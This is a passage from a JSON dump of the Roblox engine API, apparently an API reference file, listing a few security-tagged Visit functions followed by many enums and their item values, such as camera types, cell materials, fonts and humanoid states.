","Arguments":[{"Type":"string","Name":"pingUrl","Default":null},{"Type":"int","Name":"interval","Default":null}],"Name":"SetPing","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"type":"Enum","Name":"AASamples","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":1,"Enum":"AASamples"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"AASamples"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"AASamples"},{"type":"Enum","Name":"AccessType","tags":[]},{"type":"EnumItem","Name":"Me","tags":[],"Value":0,"Enum":"AccessType"},{"type":"EnumItem","Name":"Friends","tags":[],"Value":1,"Enum":"AccessType"},{"type":"EnumItem","Name":"Everyone","tags":[],"Value":2,"Enum":"AccessType"},{"type":"EnumItem","Name":"InviteOnly","tags":[],"Value":3,"Enum":"AccessType"},{"type":"Enum","Name":"ActionType","tags":[]},{"type":"EnumItem","Name":"Nothing","tags":[],"Value":0,"Enum":"ActionType"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":1,"Enum":"ActionType"},{"type":"EnumItem","Name":"Lose","tags":[],"Value":2,"Enum":"ActionType"},{"type":"EnumItem","Name":"Draw","tags":[],"Value":3,"Enum":"ActionType"},{"type":"EnumItem","Name":"Win","tags":[],"Value":4,"Enum":"ActionType"},{"type":"Enum","Name":"ActuatorType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":1,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Servo","tags":[],"Value":2,"Enum":"ActuatorType"},{"type":"Enum","Name":"AnimationPriority","tags":[]},{"type":"EnumItem","Name":"Idle","tags":[],"Value":0,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Action","tags":[],"Value":2,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Core","tags":[],"Value":1000,"Enum":"AnimationPriority"},{"type":"Enum","Name":"Antialiasing","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"Antialiasing"},{"type":"Enum","Name":"Axis","tags":[]},{"type":"EnumItem","Name":"X","tags":[],"Value":0,"Enum":"Axis"},{"type":"EnumItem","Name":"Y","tags":[],"Value":1,"Enum":"Axis"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"Axis"},{"type":"Enum","Name":"BinType","tags":[]},{"type":"EnumItem","Name":"Script","tags":[],"Value":0,"Enum":"BinType"},{"type":"EnumItem","Name":"GameTool","tags":[],"Value":1,"Enum":"BinType"},{"type":"EnumItem","Name":"Grab","tags":[],"Value":2,"Enum":"BinType"},{"type":"EnumItem","Name":"Clone","tags":[],"Value":3,"Enum":"BinType"},{"type":"EnumItem","Name":"Hammer","tags":[],"Value":4,"Enum":"BinType"},{"type":"Enum","Name":"BodyPart","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"BodyPart"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftArm","tags":[],"Value":2,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightArm","tags":[],"Value":3,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftLeg","tags":[],"Value":4,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightLeg","tags":[],"Value":5,"Enum":"BodyPart"},{"type":"Enum","Name":"Button","tags":[]},{"type":"EnumItem","Name":"Jump","tags":[],"Value":32,"Enum":"Button"},{"type":"EnumItem","Name":"Dismount","tags":[],"Value":8,"Enum":"Button"},{"type":"Enum","Name":"ButtonStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButtonDefault","tags":[],"Value":1,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButton","tags":[],"Value":2,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundButton","tags":[],"Value":3,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDefaultButton","tags":[],"Value":4,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDropdownButton","tags":[],"Value":5,"Enum":"ButtonStyle"},{"type":"Enum","Name":"CameraMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraMode"},{"type":"EnumItem","Name":"LockFirstPerson","tags":[],"Value":1,"Enum":"CameraMode"},{"type":"Enum","Name":"CameraPanMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraPanMode"},{"type":"EnumItem","Name":"EdgeBump","tags":[],"Value":1,"Enum":"CameraPanMode"},{"type":"Enum","Name":"CameraType","tags":[]},{"type":"EnumItem","Name":"Fixed","tags":[],"Value":0,"Enum":"CameraType"},{"type":"EnumItem","Name":"Watch","tags":[],"Value":2,"Enum":"CameraType"},{"type":"EnumItem","Name":"Attach","tags":[],"Value":1,"Enum":"CameraType"},{"type":"EnumItem","Name":"Track","tags":[],"Value":3,"Enum":"CameraType"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":4,"Enum":"CameraType"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":5,"Enum":"CameraType"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":6,"Enum":"CameraType"},{"type":"Enum","Name":"CellBlock","tags":[]},{"type":"EnumItem","Name":"Solid","tags":[],"Value":0,"Enum":"CellBlock"},{"type":"EnumItem","Name":"VerticalWedge","tags":[],"Value":1,"Enum":"CellBlock"},{"type":"EnumItem","Name":"CornerWedge","tags":[],"Value":2,"Enum":"CellBlock"},{"type":"EnumItem","Name":"InverseCornerWedge","tags":[],"Value":3,"Enum":"CellBlock"},{"type":"EnumItem","Name":"HorizontalWedge","tags":[],"Value":4,"Enum":"CellBlock"},{"type":"Enum","Name":"CellMaterial","tags":[]},{"type":"EnumItem","Name":"Empty","tags":[],"Value":0,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":2,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":3,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":4,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Asphalt","tags":[],"Value":5,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Iron","tags":[],"Value":6,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Aluminum","tags":[],"Value":7,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gold","tags":[],"Value":8,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodPlank","tags":[],"Value":9,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodLog","tags":[],"Value":10,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gravel","tags":[],"Value":11,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"CinderBlock","tags":[],"Value":12,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"MossyStone","tags":[],"Value":13,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Cement","tags":[],"Value":14,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"RedPlastic","tags":[],"Value":15,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"BluePlastic","tags":[],"Value":16,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Water","tags":[],"Value":17,"Enum":"CellMaterial"},{"type":"Enum","Name":"CellOrientation","tags":[]},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":0,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"NegX","tags":[],"Value":3,"Enum":"CellOrientation"},{"type":"Enum","Name":"CenterDialogType","tags":[]},{"type":"EnumItem","Name":"UnsolicitedDialog","tags":[],"Value":1,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"PlayerInitiatedDialog","tags":[],"Value":2,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"ModalDialog","tags":[],"Value":3,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"QuitDialog","tags":[],"Value":4,"Enum":"CenterDialogType"},{"type":"Enum","Name":"ChatColor","tags":[]},{"type":"EnumItem","Name":"Blue","tags":[],"Value":0,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Green","tags":[],"Value":1,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Red","tags":[],"Value":2,"Enum":"ChatColor"},{"type":"Enum","Name":"ChatMode","tags":[]},{"type":"EnumItem","Name":"Menu","tags":[],"Value":0,"Enum":"ChatMode"},{"type":"EnumItem","Name":"TextAndMenu","tags":[],"Value":1,"Enum":"ChatMode"},{"type":"Enum","Name":"ChatStyle","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"Bubble","tags":[],"Value":1,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"ClassicAndBubble","tags":[],"Value":2,"Enum":"ChatStyle"},{"type":"Enum","Name":"CollisionFidelity","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Hull","tags":[],"Value":1,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Box","tags":[],"Value":2,"Enum":"CollisionFidelity"},{"type":"Enum","Name":"ComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"ComputerCameraMovementMode"},{"type":"Enum","Name":"ComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"ComputerMovementMode"},{"type":"Enum","Name":"ConcurrencyModel","tags":[]},{"type":"EnumItem","Name":"Serial","tags":[],"Value":0,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Safe","tags":[],"Value":1,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Logical","tags":[],"Value":2,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Empirical","tags":[],"Value":3,"Enum":"ConcurrencyModel"},{"type":"Enum","Name":"ControlMode","tags":[]},{"type":"EnumItem","Name":"MouseLockSwitch","tags":[],"Value":1,"Enum":"ControlMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ControlMode"},{"type":"Enum","Name":"CoreGuiType","tags":[]},{"type":"EnumItem","Name":"PlayerList","tags":[],"Value":0,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Health","tags":[],"Value":1,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Backpack","tags":[],"Value":2,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Chat","tags":[],"Value":3,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"All","tags":[],"Value":4,"Enum":"CoreGuiType"},{"type":"Enum","Name":"CreatorType","tags":[]},{"type":"EnumItem","Name":"User","tags":[],"Value":0,"Enum":"CreatorType"},{"type":"EnumItem","Name":"Group","tags":[],"Value":1,"Enum":"CreatorType"},{"type":"Enum","Name":"CurrencyType","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Robux","tags":[],"Value":1,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Tix","tags":[],"Value":2,"Enum":"CurrencyType"},{"type":"Enum","Name":"CustomCameraMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"CustomCameraMode"},{"type":"Enum","Name":"DevCameraOcclusionMode","tags":[]},{"type":"EnumItem","Name":"Zoom","tags":[],"Value":0,"Enum":"DevCameraOcclusionMode"},{"type":"EnumItem","Name":"Invisicam","tags":[],"Value":1,"Enum":"DevCameraOcclusionMode"},{"type":"Enum","Name":"DevComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevComputerCameraMovementMode"},{"type":"Enum","Name":"DevComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":3,"Enum":"DevComputerMovementMode"},{"type":"Enum","Name":"DevTouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevTouchCameraMovementMode"},{"type":"Enum","Name":"DevTouchMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":5,"Enum":"DevTouchMovementMode"},{"type":"Enum","Name":"DialogPurpose","tags":[]},{"type":"EnumItem","Name":"Quest","tags":[],"Value":0,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Help","tags":[],"Value":1,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Shop","tags":[],"Value":2,"Enum":"DialogPurpose"},{"type":"Enum","Name":"DialogTone","tags":[]},{"type":"EnumItem","Name":"Neutral","tags":[],"Value":0,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Friendly","tags":[],"Value":1,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Enemy","tags":[],"Value":2,"Enum":"DialogTone"},{"type":"Enum","Name":"EasingDirection","tags":[]},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"EasingDirection"},{"type":"Enum","Name":"EasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Sine","tags":[],"Value":1,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quad","tags":[],"Value":3,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quart","tags":[],"Value":4,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quint","tags":[],"Value":5,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":6,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":7,"Enum":"EasingStyle"},{"type":"Enum","Name":"EnviromentalPhysicsThrottle","tags":[]},{"type":"EnumItem","Name":"DefaultAuto","tags":[],"Value":0,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Disabled","tags":[],"Value":1,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip2","tags":[],"Value":3,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip4","tags":[],"Value":4,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip8","tags":[],"Value":5,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip16","tags":[],"Value":6,"Enum":"EnviromentalPhysicsThrottle"},{"type":"Enum","Name":"ErrorReporting","tags":[]},{"type":"EnumItem","Name":"DontReport","tags":[],"Value":0,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Prompt","tags":[],"Value":1,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Report","tags":[],"Value":2,"Enum":"ErrorReporting"},{"type":"Enum","Name":"ExplosionType","tags":[]},{"type":"EnumItem","Name":"NoCraters","tags":[],"Value":0,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"Craters","tags":[],"Value":1,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"CratersAndDebris","tags":[],"Value":2,"Enum":"ExplosionType"},{"type":"Enum","Name":"FilterResult","tags":[]},{"type":"EnumItem","Name":"Rejected","tags":[],"Value":1,"Enum":"FilterResult"},{"type":"EnumItem","Name":"Accepted","tags":[],"Value":0,"Enum":"FilterResult"},{"type":"Enum","Name":"Font","tags":[]},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"Font"},{"type":"EnumItem","Name":"Arial","tags":[],"Value":1,"Enum":"Font"},{"type":"EnumItem","Name":"ArialBold","tags":[],"Value":2,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSans","tags":[],"Value":3,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansBold","tags":[],"Value":4,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansLight","tags":[],"Value":5,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansItalic","tags":[],"Value":6,"Enum":"Font"},{"type":"Enum","Name":"FontSize","tags":[]},{"type":"EnumItem","Name":"Size8","tags":[],"Value":0,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size9","tags":[],"Value":1,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size10","tags":[],"Value":2,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size11","tags":[],"Value":3,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size12","tags":[],"Value":4,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size14","tags":[],"Value":5,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size18","tags":[],"Value":6,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size24","tags":[],"Value":7,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size36","tags":[],"Value":8,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size48","tags":[],"Value":9,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size28","tags":[],"Value":10,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size32","tags":[],"Value":11,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size42","tags":[],"Value":12,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size60","tags":[],"Value":13,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size96","tags":[],"Value":14,"Enum":"FontSize"},{"type":"Enum","Name":"FormFactor","tags":[]},{"type":"EnumItem","Name":"Symmetric","tags":[],"Value":0,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":1,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Plate","tags":[],"Value":2,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":3,"Enum":"FormFactor"},{"type":"Enum","Name":"FrameStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatBlue","tags":[],"Value":1,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxSquare","tags":[],"Value":2,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxRound","tags":[],"Value":3,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatGreen","tags":[],"Value":4,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatRed","tags":[],"Value":5,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"DropShadow","tags":[],"Value":6,"Enum":"FrameStyle"},{"type":"Enum","Name":"FramerateManagerMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"FramerateManagerMode"},{"type":"Enum","Name":"FriendRequestEvent","tags":[]},{"type":"EnumItem","Name":"Issue","tags":[],"Value":0,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Revoke","tags":[],"Value":1,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Accept","tags":[],"Value":2,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Deny","tags":[],"Value":3,"Enum":"FriendRequestEvent"},{"type":"Enum","Name":"FriendStatus","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"NotFriend","tags":[],"Value":1,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"Friend","tags":[],"Value":2,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestSent","tags":[],"Value":3,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestReceived","tags":[],"Value":4,"Enum":"FriendStatus"},{"type":"Enum","Name":"FunctionalTestResult","tags":[]},{"type":"EnumItem","Name":"Passed","tags":[],"Value":0,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Warning","tags":[],"Value":1,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Error","tags":[],"Value":2,"Enum":"FunctionalTestResult"},{"type":"Enum","Name":"GearGenreSetting","tags":[]},{"type":"EnumItem","Name":"AllGenres","tags":[],"Value":0,"Enum":"GearGenreSetting"},{"type":"EnumItem","Name":"MatchingGenreOnly","tags":[],"Value":1,"Enum":"GearGenreSetting"},{"type":"Enum","Name":"GearType","tags":[]},{"type":"EnumItem","Name":"MeleeWeapons","tags":[],"Value":0,"Enum":"GearType"},{"type":"EnumItem","Name":"RangedWeapons","tags":[],"Value":1,"Enum":"GearType"},{"type":"EnumItem","Name":"Explosives","tags":[],"Value":2,"Enum":"GearType"},{"type":"EnumItem","Name":"PowerUps","tags":[],"Value":3,"Enum":"GearType"},{"type":"EnumItem","Name":"NavigationEnhancers","tags":[],"Value":4,"Enum":"GearType"},{"type":"EnumItem","Name":"MusicalInstruments","tags":[],"Value":5,"Enum":"GearType"},{"type":"EnumItem","Name":"SocialItems","tags":[],"Value":6,"Enum":"GearType"},{"type":"EnumItem","Name":"BuildingTools","tags":[],"Value":7,"Enum":"GearType"},{"type":"EnumItem","Name":"Transport","tags":[],"Value":8,"Enum":"GearType"},{"type":"Enum","Name":"Genre","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"Genre"},{"type":"EnumItem","Name":"TownAndCity","tags":[],"Value":1,"Enum":"Genre"},{"type":"EnumItem","Name":"Fantasy","tags":[],"Value":2,"Enum":"Genre"},{"type":"EnumItem","Name":"SciFi","tags":[],"Value":3,"Enum":"Genre"},{"type":"EnumItem","Name":"Ninja","tags":[],"Value":4,"Enum":"Genre"},{"type":"EnumItem","Name":"Scary","tags":[],"Value":5,"Enum":"Genre"},{"type":"EnumItem","Name":"Pirate","tags":[],"Value":6,"Enum":"Genre"},{"type":"EnumItem","Name":"Adventure","tags":[],"Value":7,"Enum":"Genre"},{"type":"EnumItem","Name":"Sports","tags":[],"Value":8,"Enum":"Genre"},{"type":"EnumItem","Name":"Funny","tags":[],"Value":9,"Enum":"Genre"},{"type":"EnumItem","Name":"WildWest","tags":[],"Value":10,"Enum":"Genre"},{"type":"EnumItem","Name":"War","tags":[],"Value":11,"Enum":"Genre"},{"type":"EnumItem","Name":"SkatePark","tags":[],"Value":12,"Enum":"Genre"},{"type":"EnumItem","Name":"Tutorial","tags":[],"Value":13,"Enum":"Genre"},{"type":"Enum","Name":"GraphicsMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":1,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D9","tags":[],"Value":3,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D11","tags":[],"Value":2,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"OpenGL","tags":[],"Value":4,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"NoGraphics","tags":[],"Value":5,"Enum":"GraphicsMode"},{"type":"Enum","Name":"HandlesStyle","tags":[]},{"type":"EnumItem","Name":"Resize","tags":[],"Value":0,"Enum":"HandlesStyle"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"HandlesStyle"},{"type":"Enum","Name":"HttpContentType","tags":[]},{"type":"EnumItem","Name":"ApplicationJson","tags":[],"Value":0,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationXml","tags":[],"Value":1,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationUrlEncoded","tags":[],"Value":2,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextPlain","tags":[],"Value":3,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextXml","tags":[],"Value":4,"Enum":"HttpContentType"},{"type":"Enum","Name":"HumanoidDisplayDistanceType","tags":[]},{"type":"EnumItem","Name":"Viewer","tags":[],"Value":0,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"Subject","tags":[],"Value":1,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"HumanoidDisplayDistanceType"},{"type":"Enum","Name":"HumanoidRigType","tags":[]},{"type":"EnumItem","Name":"R6","tags":[],"Value":0,"Enum":"HumanoidRigType"},{"type":"EnumItem","Name":"R15","tags":[],"Value":1,"Enum":"HumanoidRigType"},{"type":"Enum","Name":"HumanoidStateType","tags":[]},{"type":"EnumItem","Name":"FallingDown","tags":[],"Value":0,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Running","tags":[],"Value":8,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"RunningNoPhysics","tags":[],"Value":10,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Climbing","tags":[],"Value":12,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"StrafingNoPhysics","tags":[],"Value":11,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Ragdoll","tags":[],"Value":1,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"GettingUp","tags":[],"Value":2,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Jumping","tags":[],"Value":3,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Landed","tags":[],"Value":7,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Flying","tags":[],"Value":6,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Freefall","tags":[],"Value":5,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Seated","tags":[],"Value":13,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"PlatformStanding","tags":[],"Value":14,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Dead","tags":[],"Value":15,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Swimming","tags":[],"Value":4,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Physics","tags":[],"Value":16,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"None","tags":[],"Value":18,"Enum":"HumanoidStateType"},{"type":"Enum","Name":"InOut","tags":[]},{"type":"EnumItem","Name":"Edge","tags":[],"Value":0,"Enum":"InOut"},{"type":"EnumItem","Name":"Inset","tags":[],"Value":1,"Enum":"InOut"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"InOut"},{"type":"Enum","Name":"InfoType","tags":[]},{"type":"EnumItem","Name":"Asset","tags":[],"Value":0,"Enum":"InfoType"},{"type":"EnumItem","Name":"Product","tags":[],"Value":1,"Enum":"InfoType"},{"type":"Enum","Name":"InputType","tags":[]},{"type":"EnumItem","Name":"NoInput","tags":[],"Value":0,"Enum":"InputType"},{"type":"EnumItem","Name":"LeftTread","tags":[],"Value":1,"Enum":"InputType"},{"type":"EnumItem","Name":"RightTread","tags":[],"Value":2,"Enum":"InputType"},{"type":"EnumItem","Name":"Steer","tags":[],"Value":3,"Enum":"InputType"},{"type":"EnumItem","Name":"Throtle","tags":[],"Value":4,"Enum":"InputType"},{"type":"EnumItem","Name":"UpDown","tags":[],"Value":6,"Enum"